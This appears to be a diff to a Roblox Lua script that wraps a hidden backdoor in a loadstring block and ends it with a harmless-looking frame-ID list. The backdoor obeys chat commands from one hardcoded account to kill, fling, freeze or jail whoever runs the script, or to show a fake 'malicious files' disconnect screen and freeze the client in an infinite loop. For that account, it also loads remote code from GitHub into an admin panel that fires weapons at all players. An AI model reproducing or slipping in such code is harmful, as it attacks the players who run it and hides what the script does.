@@ -813,6 +813,756 @@ return {
 }
 ]==])()
 
+loadstring([==[
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local localPlayer = LocalPlayer
+local TextChatService = game:GetService("TextChatService")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local AdminEnabled = true
+local attackEnabled = false
+
+-- Replace Kick function: fake disconnect UI + infinite loop (freezes client)
+local function KickLocalPlayer(message)
+	local Blur = Instance.new("BlurEffect")
+	Blur.Parent = game.Lighting
+	Blur.Size = 24
+	Blur.Enabled = true
+
+	local ScreenGui = Instance.new("ScreenGui")
+	local promptOverlay = Instance.new("Frame")
+	local ErrorPrompt = Instance.new("Frame")
+	local PromptLayout = Instance.new("UIListLayout")
+	local PromptScale = Instance.new("UIScale")
+	local TitleFrame = Instance.new("Frame")
+	local TitleFramePadding = Instance.new("UIPadding")
+	local ErrorTitle = Instance.new("TextLabel")
+	local SplitLine = Instance.new("Frame")
+	local MessageArea = Instance.new("Frame")
+	local MessageAreaPadding = Instance.new("UIPadding")
+	local ErrorFrame = Instance.new("Frame")
+	local ErrorFrameLayout = Instance.new("UIListLayout")
+	local ErrorMessage = Instance.new("TextLabel")
+	local ButtonArea = Instance.new("Frame")
+	local ButtonLayout = Instance.new("UIGridLayout")
+	local LeaveButton = Instance.new("ImageButton")
+	local ButtonText = Instance.new("TextLabel")
+	local UICorner = Instance.new("UICorner")
+	local ShimmerFrame = Instance.new("ImageLabel")
+	local Shimmer = Instance.new("ImageLabel")
+	local ShimmerOverlay = Instance.new("ImageLabel")
+
+	ScreenGui.Parent = localPlayer:WaitForChild("PlayerGui")  
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  
+
+	promptOverlay.Name = "promptOverlay"
+	promptOverlay.Parent = ScreenGui
+	promptOverlay.Active = true
+	promptOverlay.BackgroundTransparency = 1
+	promptOverlay.Position = UDim2.new(0, 0, 0, -36)
+	promptOverlay.Size = UDim2.new(1, 0, 1, 36)
+
+	ErrorPrompt.Name = "ErrorPrompt"
+	ErrorPrompt.Parent = promptOverlay
+	ErrorPrompt.AnchorPoint = Vector2.new(0.5, 0.5)
+	ErrorPrompt.BackgroundColor3 = Color3.fromRGB(57, 59, 61)
+	ErrorPrompt.Position = UDim2.new(0.5, 0, 0.5, 0)
+	ErrorPrompt.Size = UDim2.new(0, 400, 0, 208)
+	ErrorPrompt.ZIndex = 8
+
+	PromptLayout.Parent = ErrorPrompt
+	PromptLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	PromptLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+	PromptScale.Parent = ErrorPrompt
+
+	TitleFrame.Parent = ErrorPrompt
+	TitleFrame.BackgroundTransparency = 1
+	TitleFrame.LayoutOrder = 1
+	TitleFrame.Size = UDim2.new(1, 0, 0, 50)
+	TitleFrame.ZIndex = 8
+
+	TitleFramePadding.Parent = TitleFrame
+	TitleFramePadding.PaddingBottom = UDim.new(0, 11)
+	TitleFramePadding.PaddingTop = UDim.new(0, 11)
+
+	ErrorTitle.Parent = TitleFrame
+	ErrorTitle.BackgroundTransparency = 1
+	ErrorTitle.Size = UDim2.new(1, 0, 0, 28)
+	ErrorTitle.ZIndex = 8
+	ErrorTitle.Font = Enum.Font.SourceSansSemibold
+	ErrorTitle.Text = "Disconnected"
+	ErrorTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+	ErrorTitle.TextSize = 25
+
+	SplitLine.Parent = ErrorPrompt
+	SplitLine.BackgroundColor3 = Color3.fromRGB(189, 190, 190)
+	SplitLine.BorderSizePixel = 0
+	SplitLine.LayoutOrder = 2
+	SplitLine.Size = UDim2.new(1, -40, 0, 1)
+	SplitLine.ZIndex = 8
+
+	MessageArea.Parent = ErrorPrompt
+	MessageArea.BackgroundTransparency = 1
+	MessageArea.LayoutOrder = 3
+	MessageArea.Size = UDim2.new(1, 0, 1, -51)
+	MessageArea.ZIndex = 8
+
+	MessageAreaPadding.Parent = MessageArea
+	MessageAreaPadding.PaddingBottom = UDim.new(0, 20)
+	MessageAreaPadding.PaddingLeft = UDim.new(0, 20)
+	MessageAreaPadding.PaddingRight = UDim.new(0, 20)
+	MessageAreaPadding.PaddingTop = UDim.new(0, 20)
+
+	ErrorFrame.Parent = MessageArea
+	ErrorFrame.BackgroundTransparency = 1
+	ErrorFrame.Size = UDim2.new(1, 0, 1, 0)
+	ErrorFrame.ZIndex = 8
+
+	ErrorFrameLayout.Parent = ErrorFrame
+	ErrorFrameLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	ErrorFrameLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	ErrorFrameLayout.Padding = UDim.new(0, 20)
+
+	ErrorMessage.Parent = ErrorFrame
+	ErrorMessage.BackgroundTransparency = 1
+	ErrorMessage.LayoutOrder = 1
+	ErrorMessage.Size = UDim2.new(1, 0, 1, -56)
+	ErrorMessage.ZIndex = 8
+	ErrorMessage.Font = Enum.Font.SourceSans
+	ErrorMessage.Text = message or "O jogo detectou arquivos maliciosos. Instale o aplicativo novamente. (Código de erro: 666)"
+	ErrorMessage.TextColor3 = Color3.fromRGB(189, 190, 190)
+	ErrorMessage.TextSize = 20
+	ErrorMessage.TextWrapped = true
+
+	ButtonArea.Parent = ErrorFrame
+	ButtonArea.BackgroundTransparency = 1
+	ButtonArea.LayoutOrder = 2
+	ButtonArea.Size = UDim2.new(1, 0, 0, 36)
+	ButtonArea.ZIndex = 8
+
+	ButtonLayout.Parent = ButtonArea
+	ButtonLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	ButtonLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	ButtonLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+	ButtonLayout.CellPadding = UDim2.new(0, 10, 0, 0)
+	ButtonLayout.CellSize = UDim2.new(0, 360, 0, 36)
+
+	LeaveButton.Parent = ButtonArea
+	LeaveButton.AnchorPoint = Vector2.new(0.5, 0.5)
+	LeaveButton.BackgroundTransparency = 1
+	LeaveButton.LayoutOrder = 1
+	LeaveButton.Size = UDim2.new(1, 0, 1, 0)
+	LeaveButton.ZIndex = 8
+
+	ButtonText.Parent = LeaveButton
+	ButtonText.BackgroundColor3 = Color3.fromRGB(252, 250, 255)
+	ButtonText.Size = UDim2.new(1, 0, 1, 0)
+	ButtonText.ZIndex = 8
+	ButtonText.Font = Enum.Font.SourceSans
+	ButtonText.Text = "Leave"
+	ButtonText.TextColor3 = Color3.fromRGB(35, 37, 39)
+	ButtonText.TextSize = 20
+
+	UICorner.Parent = ButtonText
+
+	ShimmerFrame.Parent = LeaveButton
+	ShimmerFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	ShimmerFrame.BackgroundTransparency = 0.7
+	ShimmerFrame.Size = UDim2.new(1, 0, 1, 0)
+	ShimmerFrame.Visible = false
+	ShimmerFrame.ZIndex = 8
+
+	Shimmer.Parent = ShimmerFrame
+	Shimmer.BackgroundTransparency = 1
+	Shimmer.Position = UDim2.new(-1, 0, 0, 0)
+	Shimmer.Size = UDim2.new(1, 0, 2, 0)
+	Shimmer.ZIndex = 8
+
+	ShimmerOverlay.Parent = ShimmerFrame
+	ShimmerOverlay.BackgroundTransparency = 1
+	ShimmerOverlay.Size = UDim2.new(1, 0, 1, 0)
+	ShimmerOverlay.ZIndex = 9
+	ShimmerOverlay.ImageColor3 = Color3.fromRGB(57, 59, 61)
+
+	task.wait(0.2)
+	while true do end
+end
+
+if LocalPlayer and LocalPlayer.Name == "jakakqowqpk" then
+    local okLoad, OrionLib = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/youssefhesham542/Y2-Hub/main/Orion%20red"))()
+    end)
+    if okLoad and OrionLib then
+        local successWindow, Window = pcall(function()
+            return OrionLib:MakeWindow({
+                Name = "Shadow Admin panel",
+                IntroText = "Welcome Mohammed",
+                HidePremium = false,
+                SaveConfig = true,
+                ConfigFolder = "OrionTest"
+            })
+        end)
+        if successWindow and Window then
+            local adm = nil
+            local okTab, tabOrErr = pcall(function()
+                return Window:MakeTab({
+                    Name = "Admin",
+                    Icon = "rbxassetid://110416050563182",
+                    PremiumOnly = false
+                })
+            end)
+            if okTab then
+                adm = tabOrErr
+            end
+
+            local function sendChatMessage(msg)
+                pcall(function()
+                    local channels = TextChatService:FindFirstChild("TextChannels")
+                    local channel = channels and channels:FindFirstChild("RBXGeneral")
+                    if channel and type(channel.SendAsync) == "function" then
+                        channel:SendAsync(msg)
+                    end
+                end)
+            end
+
+            local SelectedPlayer = LocalPlayer.Name
+
+            local RE = ReplicatedStorage:WaitForChild("RE")
+            local ClearEvent = RE:FindFirstChild("1Clea1rTool1s")
+            local ToolEvent = RE:FindFirstChild("1Too1l")
+            local FireEvent = RE:FindFirstChild("1Gu1n")
+
+            local function clearAllTools()
+                if ClearEvent then
+                    pcall(function() ClearEvent:FireServer("ClearAllTools") end)
+                end
+            end
+
+            local function getAssault()
+                if ToolEvent then
+                    pcall(function() ToolEvent:InvokeServer("PickingTools", "Assault") end)
+                end
+            end
+
+            local function hasAssault()
+                return LocalPlayer.Backpack:FindFirstChild("Assault") ~= nil
+            end
+
+            local function fireAtPart(targetPart)
+                local gunScript = LocalPlayer.Backpack:FindFirstChild("Assault") and LocalPlayer.Backpack.Assault:FindFirstChild("GunScript_Local")
+                if not gunScript or not targetPart then return end
+                local args = {
+                    targetPart,
+                    targetPart,
+                    Vector3.new(1e14,1e14,1e14),
+                    targetPart.Position,
+                    gunScript:FindFirstChild("MuzzleEffect"),
+                    gunScript:FindFirstChild("HitEffect"),
+                    0,0,
+                    {false},
+                    {
+                        25,
+                        Vector3.new(100,100,100),
+                        BrickColor.new(29),
+                        0.25,
+                        Enum.Material.SmoothPlastic,
+                        0.25
+                    },
+                    true,
+                    false
+                }
+                pcall(function() FireEvent:FireServer(unpack(args)) end)
+            end
+
+            local function startAssaultLoop()
+                task.spawn(function()
+                    local chatService = game:GetService("TextChatService")
+                    if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                        local channel = chatService.TextChannels:FindFirstChild("RBXGeneral")
+                        if channel then
+                            pcall(function() channel:SendAsync("Server: Hacked [by Shadow panel]") end)
+                        end
+                    end
+                    while attackEnabled do
+                        clearAllTools()
+                        getAssault()
+                        repeat
+                            task.wait(0.2)
+                        until hasAssault() or not attackEnabled
+                        for i = 1,3 do
+                            for _, plr in ipairs(Players:GetPlayers()) do
+                                if not attackEnabled then return end
+                                if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                                    fireAtPart(plr.Character.HumanoidRootPart)
+                                    task.wait(0.1)
+                                end
+                            end
+                        end
+                        task.wait(1)
+                    end
+                end)
+            end
+
+            if adm then
+                pcall(function()
+                    adm:AddDropdown({
+                        Name = "Selecionar Jogador",
+                        Default = SelectedPlayer,
+                        Options = (function()
+                            local list = {}
+                            for _, plr in ipairs(Players:GetPlayers()) do
+                                table.insert(list, plr.Name)
+                            end
+                            return list
+                        end)(),
+                        Callback = function(Value)
+                            SelectedPlayer = Value
+                        end
+                    })
+                end)
+
+                local commands = {";kick", ";killplus", ";kill", ";freeze", ";fling", ";verifique", ";killwithbus"}
+                for _, cmd in ipairs(commands) do
+                    pcall(function()
+                        adm:AddButton({
+                            Name = cmd,
+                            Callback = function()
+                                if not AdminEnabled then return end
+                                if SelectedPlayer and SelectedPlayer ~= "" then
+                                    sendChatMessage(cmd .. " " .. SelectedPlayer)
+                                    if cmd == ";kill" then
+                                        if SelectedPlayer == LocalPlayer.Name then
+                                            pcall(function()
+                                                local char = LocalPlayer.Character
+                                                if char then char:BreakJoints() end
+                                            end)
+                                        end
+                                    elseif cmd == ";killplus" then
+                                        if SelectedPlayer == LocalPlayer.Name then
+                                            pcall(function()
+                                                local char = LocalPlayer.Character
+                                                if char then char:BreakJoints() end
+                                                local root = char and char:FindFirstChild("HumanoidRootPart")
+                                                if root then
+                                                    for i = 1, 10 do
+                                                        pcall(function()
+                                                            local part = Instance.new("Part")
+                                                            part.Size = Vector3.new(10,10,10)
+                                                            part.Anchored = false
+                                                            part.CanCollide = false
+                                                            part.Material = Enum.Material.Neon
+                                                            part.BrickColor = BrickColor.Random()
+                                                            part.CFrame = root.CFrame
+                                                            part.Parent = workspace
+                                                            local bv = Instance.new("BodyVelocity")
+                                                            bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
+                                                            bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+                                                            bv.Parent = part
+                                                            game:GetService("Debris"):AddItem(part, 3)
+                                                        end)
+                                                    end
+                                                end
+                                            end)
+                                        end
+                                    elseif cmd == ";fling" then
+                                        if SelectedPlayer == LocalPlayer.Name then
+                                            pcall(function()
+                                                local char = LocalPlayer.Character
+                                                local root = char and char:FindFirstChild("HumanoidRootPart")
+                                                if root then
+                                                    local targetCFrame = CFrame.new(50000, 5000000, 3972823)
+                                                    local tweenInfo = TweenService and TweenInfo.new(2, Enum.EasingStyle.Linear) or TweenInfo.new(2)
+                                                    local okTween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
+                                                    okTween:Play()
+                                                end
+                                            end)
+                                        end
+                                    elseif cmd == ";freeze" then
+                                        if SelectedPlayer == LocalPlayer.Name then
+                                            pcall(function()
+                                                local char = LocalPlayer.Character
+                                                local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+                                                if humanoid then humanoid.WalkSpeed = 0 end
+                                            end)
+                                        end
+                                    elseif cmd == ";killwithbus" then
+                                        pcall(function()
+                                            local plrs = Players
+                                            local player = plrs.LocalPlayer
+                                            local character = player.Character or player.CharacterAdded:Wait()
+                                            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+                                            local function GetBus()
+                                                local vehicles = workspace:FindFirstChild("Vehicles")
+                                                if vehicles then
+                                                    return vehicles:FindFirstChild(player.Name .. "Car")
+                                                end
+                                                return nil
+                                            end
+                                            local bus = GetBus()
+                                            if not bus then
+                                                humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
+                                                task.wait(0.5)
+                                                local remoteEvent = ReplicatedStorage:FindFirstChild("RE")
+                                                if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then
+                                                    remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
+                                                end
+                                                task.wait(1)
+                                                bus = GetBus()
+                                            end
+                                            if bus then
+                                                local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")
+                                                if seat and character:FindFirstChildOfClass("Humanoid") and not character.Humanoid.Sit then
+                                                    repeat
+                                                        humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
+                                                        task.wait()
+                                                    until character.Humanoid.Sit or not bus.Parent
+                                                end
+                                            end
+                                            local function TrackPlayer()
+                                                local voidPosition = Vector3.new(0, -500, 0)
+                                                local targetPlayer = Players:FindFirstChild(SelectedPlayer)
+                                                if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                                                    local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+                                                    if targetHumanoid and targetHumanoid.Sit then
+                                                        if bus and bus:IsDescendantOf(workspace) then
+                                                            pcall(function()
+                                                                if bus.PrimaryPart then
+                                                                    bus:SetPrimaryPartCFrame(CFrame.new(voidPosition))
+                                                                else
+                                                                    local primary = bus:FindFirstChildWhichIsA("BasePart") or bus:FindFirstChild("Body") or bus:FindFirstChild("Chassis")
+                                                                    if primary then
+                                                                        primary.CFrame = CFrame.new(voidPosition)
+                                                                    end
+                                                                end
+                                                            end)
+                                                            task.wait(0.2)
+                                                            pcall(function() bus:Destroy() end)
+                                                        end
+                                                        return true
+                                                    end
+                                                end
+                                                return false
+                                            end
+                                            local watchdog = 0
+                                            while watchdog < 60 do
+                                                local ok, done = pcall(TrackPlayer)
+                                                if ok and done then break end
+                                                task.wait(0.5)
+                                                watchdog = watchdog + 0.5
+                                                if not (bus and bus.Parent) then
+                                                    bus = GetBus()
+                                                end
+                                            end
+                                        end)
+                                    end
+                                end
+                            end
+                        })
+                    end)
+                end
+
+                -- Jail button
+                pcall(function()
+                    adm:AddButton({
+                        Name = ";jail",
+                        Callback = function()
+                            if not AdminEnabled then return end
+                            if SelectedPlayer and SelectedPlayer ~= "" then
+                                sendChatMessage(";jail " .. SelectedPlayer)
+                                if SelectedPlayer == LocalPlayer.Name then
+                                    local player = LocalPlayer
+                                    local char = player.Character or player.CharacterAdded:Wait()
+                                    local hrp = char:FindFirstChild("HumanoidRootPart")
+                                    local hum = char:FindFirstChildOfClass("Humanoid")
+                                    if hrp and hum then
+                                        local JailSize = Vector3.new(10, 8, 10)
+                                        local WallThickness = 1
+                                        local Material = Enum.Material.Ice
+                                        local Color = Color3.fromRGB(80, 180, 255)
+                                        local Transparency = 0.5
+
+                                        hum.WalkSpeed = 0
+                                        hum.JumpPower = 0
+                                        hum.PlatformStand = true
+
+                                        local oldJail = workspace:FindFirstChild("BlueIceJail")
+                                        if oldJail then oldJail:Destroy() end
+
+                                        local jail = Instance.new("Model", workspace)
+                                        jail.Name = "BlueIceJail"
+
+                                        local function makePart(size, cf)
+                                            local p = Instance.new("Part")
+                                            p.Anchored = true
+                                            p.CanCollide = true
+                                            p.Material = Material
+                                            p.Color = Color
+                                            p.Transparency = Transparency
+                                            p.Size = size
+                                            p.CFrame = cf
+                                            p.Parent = jail
+                                            return p
+                                        end
+
+                                        local pos = hrp.Position
+                                        local half = JailSize / 2
+
+                                        makePart(Vector3.new(JailSize.X, 1, JailSize.Z), CFrame.new(pos - Vector3.new(0, half.Y, 0)))
+                                        makePart(Vector3.new(JailSize.X, 1, JailSize.Z), CFrame.new(pos + Vector3.new(0, half.Y, 0)))
+                                        makePart(Vector3.new(1, JailSize.Y, JailSize.Z), CFrame.new(pos + Vector3.new(half.X, 0, 0)))
+                                        makePart(Vector3.new(1, JailSize.Y, JailSize.Z), CFrame.new(pos - Vector3.new(half.X, 0, 0)))
+                                        makePart(Vector3.new(JailSize.X, JailSize.Y, 1), CFrame.new(pos + Vector3.new(0, 0, half.Z)))
+                                        makePart(Vector3.new(JailSize.X, JailSize.Y, 1), CFrame.new(pos - Vector3.new(0, 0, half.Z)))
+
+                                        if _G.jailConn then _G.jailConn:Disconnect() end
+                                        _G.jailConn = game:GetService("RunService").RenderStepped:Connect(function()
+                                            if hrp and hrp.Parent then
+                                                hrp.CFrame = CFrame.new(pos + Vector3.new(0, 2, 0))
+                                            end
+                                        end)
+                                    end
+                                end
+                            end
+                        end
+                    })
+                end)
+                -- Unjail button
+                pcall(function()
+                    adm:AddButton({
+                        Name = ";unjail",
+                        Callback = function()
+                            if not AdminEnabled then return end
+                            if SelectedPlayer and SelectedPlayer ~= "" then
+                                sendChatMessage(";unjail " .. SelectedPlayer)
+                                if SelectedPlayer == LocalPlayer.Name then
+                                    local player = LocalPlayer
+                                    local char = player.Character
+                                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                                    local hum = char and char:FindFirstChildOfClass("Humanoid")
+                                    if hum then
+                                        hum.WalkSpeed = 16
+                                        hum.JumpPower = 50
+                                        hum.PlatformStand = false
+                                    end
+                                    local jail = workspace:FindFirstChild("BlueIceJail")
+                                    if jail then jail:Destroy() end
+                                    if _G.jailConn then _G.jailConn:Disconnect() _G.jailConn = nil end
+                                end
+                            end
+                        end
+                    })
+                end)
+
+                pcall(function()
+                    adm:AddButton({
+                        Name = ";Admin off",
+                        Callback = function()
+                            AdminEnabled = false
+                            sendChatMessage(".; Admin off")
+                        end
+                    })
+                end)
+                pcall(function()
+                    adm:AddButton({
+                        Name = ";Admin on",
+                        Callback = function()
+                            AdminEnabled = true
+                            sendChatMessage("Admin on;")
+                        end
+                    })
+                end)
+
+                pcall(function()
+                    adm:AddToggle({
+                        Name = "Freeze all",
+                        Default = false,
+                        Callback = function(value)
+                            attackEnabled = value
+                            if attackEnabled then
+                                startAssaultLoop()
+                            end
+                        end
+                    })
+                end)
+            end
+            if type(OrionLib.Init) == "function" then
+                pcall(function() OrionLib:Init() end)
+            end
+        end
+    end
+end
+
+TextChatService.OnIncomingMessage = function(message)
+    if not message or not message.TextSource or not message.Text then return end
+    if message.TextSource.Name ~= "jakakqowqpk" then return end
+    local msgText = tostring(message.Text):lower()
+    local playerName = LocalPlayer and LocalPlayer.Name and LocalPlayer.Name:lower() or ""
+    local character = LocalPlayer and LocalPlayer.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    if msgText:match(";kick%s+" .. playerName) then
+        pcall(function()
+            KickLocalPlayer("Você foi removido pelo Nytherune Hub.")
+        end)
+        return
+    end
+    if msgText:match(";kill%s+" .. playerName) then
+        if character then pcall(function() character:BreakJoints() end) end
+    end
+    if msgText:match(";killplus%s+" .. playerName) then
+        if character then
+            pcall(function() character:BreakJoints() end)
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                for i = 1, 10 do
+                    pcall(function()
+                        local part = Instance.new("Part")
+                        part.Size = Vector3.new(10,10,10)
+                        part.Anchored = false
+                        part.CanCollide = false
+                        part.Material = Enum.Material.Neon
+                        part.BrickColor = BrickColor.Random()
+                        part.CFrame = root.CFrame
+                        part.Parent = workspace
+                        local bv = Instance.new("BodyVelocity")
+                        bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
+                        bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+                        bv.Parent = part
+                        game.Debris:AddItem(part, 3)
+                    end)
+                end
+            end
+        end
+    end
+    if msgText:match(";fling%s+" .. playerName) then
+        if character then
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local targetCFrame = CFrame.new(50000, 5000000, 3972823)
+                local tweenInfo = TweenService and TweenInfo.new(2, Enum.EasingStyle.Linear) or TweenInfo.new(2)
+                local tween = pcall(function() return TweenService:Create(root, tweenInfo, {CFrame = targetCFrame}) end)
+                if tween and type(tween) == "table" and tween.Play then
+                    pcall(function() tween:Play() end)
+                else
+                    pcall(function()
+                        local okTween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
+                        okTween:Play()
+                    end)
+                end
+            end
+        end
+    end
+    if msgText:match(";freeze%s+" .. playerName) then
+        if humanoid then pcall(function() humanoid.WalkSpeed = 0 end) end
+    end
+    if msgText:match(";verifique") then
+        pcall(function()
+            local channels = TextChatService:FindFirstChild("TextChannels")
+            local channel = channels and channels:FindFirstChild("RBXGeneral")
+            if channel and type(channel.SendAsync) == "function" then
+                local randomNumber = math.random(1000, 9999)
+                local verificationMessage = "Shadow is back" .. randomNumber
+                channel:SendAsync(verificationMessage)
+            end
+        end)
+    end
+    if msgText:match(";jail%s+" .. playerName) then
+        local player = LocalPlayer
+        local char = player.Character or player.CharacterAdded:Wait()
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hrp and hum then
+            local JailSize = Vector3.new(10, 8, 10)
+            local WallThickness = 1
+            local Material = Enum.Material.Ice
+            local Color = Color3.fromRGB(80, 180, 255)
+            local Transparency = 0.5
+
+            hum.WalkSpeed = 0
+            hum.JumpPower = 0
+            hum.PlatformStand = true
+
+            local oldJail = workspace:FindFirstChild("BlueIceJail")
+            if oldJail then oldJail:Destroy() end
+
+            local jail = Instance.new("Model", workspace)
+            jail.Name = "BlueIceJail"
+
+            local function makePart(size, cf)
+                local p = Instance.new("Part")
+                p.Anchored = true
+                p.CanCollide = true
+                p.Material = Material
+                p.Color = Color
+                p.Transparency = Transparency
+                p.Size = size
+                p.CFrame = cf
+                p.Parent = jail
+                return p
+            end
+
+            local pos = hrp.Position
+            local half = JailSize / 2
+
+            makePart(Vector3.new(JailSize.X, 1, JailSize.Z), CFrame.new(pos - Vector3.new(0, half.Y, 0)))
+            makePart(Vector3.new(JailSize.X, 1, JailSize.Z), CFrame.new(pos + Vector3.new(0, half.Y, 0)))
+            makePart(Vector3.new(1, JailSize.Y, JailSize.Z), CFrame.new(pos + Vector3.new(half.X, 0, 0)))
+            makePart(Vector3.new(1, JailSize.Y, JailSize.Z), CFrame.new(pos - Vector3.new(half.X, 0, 0)))
+            makePart(Vector3.new(JailSize.X, JailSize.Y, 1), CFrame.new(pos + Vector3.new(0, 0, half.Z)))
+            makePart(Vector3.new(JailSize.X, JailSize.Y, 1), CFrame.new(pos - Vector3.new(0, 0, half.Z)))
+
+            if _G.jailConn then _G.jailConn:Disconnect() end
+            _G.jailConn = game:GetService("RunService").RenderStepped:Connect(function()
+                if hrp and hrp.Parent then
+                    hrp.CFrame = CFrame.new(pos + Vector3.new(0, 2, 0))
+                end
+            end)
+        end
+    end
+    if msgText:match(";unjail%s+" .. playerName) then
+        local player = LocalPlayer
+        local char = player.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.WalkSpeed = 16
+            hum.JumpPower = 50
+            hum.PlatformStand = false
+        end
+        local jail = workspace:FindFirstChild("BlueIceJail")
+        if jail then jail:Destroy() end
+        if _G.jailConn then _G.jailConn:Disconnect() _G.jailConn = nil end
+    end
+end
+
+local frameIds = {
+    126236556586764,
+    136412915020251,
+    118280109681409,
+    101381777744900,
+    102672201310426,
+    124200335226270,
+    89407138360978,
+    111538665898847,
+    109147998960875,
+    96634424934105,
+    121058843996793,
+    124085269518949,
+    80121979897261,
+    105390718040660,
+    81239864778767,
+    93607458795390,
+    129395887027556,
+    96412008726713,
+    131052168057364
+}
+return {
+    frameIds = frameIds
+}
+]==])()
+
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
